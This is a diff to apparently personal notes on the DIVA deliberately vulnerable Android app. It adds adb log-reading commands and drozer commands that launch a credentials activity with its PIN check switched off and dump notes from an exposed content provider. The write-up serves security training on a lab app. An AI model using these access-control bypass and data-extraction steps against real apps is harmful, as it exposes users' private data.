@@ -33,6 +33,8 @@
 ## Diva Writeup
 ### Insecure Logging
 - adb logcat -t 20
+- adb ps
+- adb logcat | grep [processID]
 
 ### Hardcoding Issues – Part 1
 - jadx diva.apk
@@ -67,7 +69,7 @@ Insecure Data Storage – Part 3
 ### Access Control Issues – Part 1
 - cd resources
 - cat AndroidManifest.xml
-- adb shell am start -a jakhar.aseem.diva.actions.VIEW_CREDS
+- adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS
 
 ### Access Control Issues – Part 2
 - dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity --extra boolean check_pin false
@@ -76,6 +78,8 @@ Insecure Data Storage – Part 3
 - dz> run app.provider.finduri jakhar.aseem.diva
 - dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
 - dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
+- dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=3"
+- dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "title,note"
 
 ## Tools for Static Analysis
 - Androwarn (for Android)
